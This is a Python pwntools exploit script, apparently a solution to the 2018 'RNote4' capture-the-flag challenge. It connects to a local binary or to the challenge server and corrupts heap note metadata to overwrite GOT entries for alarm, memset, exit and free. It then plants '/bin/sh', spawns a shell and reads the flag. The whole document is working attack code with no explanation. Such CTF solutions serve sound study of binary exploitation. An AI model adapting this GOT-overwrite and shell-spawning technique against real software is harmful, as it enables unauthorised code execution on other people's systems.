#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./RNote4"
elf=ELF(pwn_file)

def exp():
    if len(sys.argv)==1:
        conn=process([pwn_file,"1000"])
        pid=conn.pid
    else:
        conn=remote("rnote4.2018.teamrois.cn",6767)
        pid=0

    def debug():
        log.debug("process pid:%d"%pid)
        pause()

    def add(size,content):
        conn.send("\x01")
        conn.send(chr(size))
        conn.send(content)

    def edit(idx,size,content):
        conn.send("\x02")
        conn.send(chr(idx))
        conn.send(chr(size))
        conn.send(content)

    def dele(idx):
        conn.send("\x03")
        conn.send(chr(idx))

    def change_mem(add,data):
        f={
            0x38:p64(add)
        }
        edit(2,0x40,fit(f,filler="\x00",length=0x40))
        edit(3,len(data),data)

    add(0xa0,"\x00"*0xa0)
    add(0x20,"\x00"*0x20)

    add(0x20,"\x00"*0x20)
    add(0x20,"\x00"*0x20)

    change_mem(elf.got["alarm"],"\x70\xc7")
    change_mem(elf.got["memset"],p64(elf.sym["alarm"]))
    change_mem(elf.got["exit"],p64(0x400ADB))
    change_mem(elf.got["free"],p64(0x4008A1))
    change_mem(0x6020C0,"/bin/sh\x00")
    dele(1)
    try:
        conn.send("\x00")
        conn.sendline("cat flag")
        conn.interactive()
        data=conn.recv()
        print data
        ret=True
    except Exception as e:
        ret=False
    finally:
        conn.close()
        return ret

if __name__=="__main__":
    while not exp():
        pass
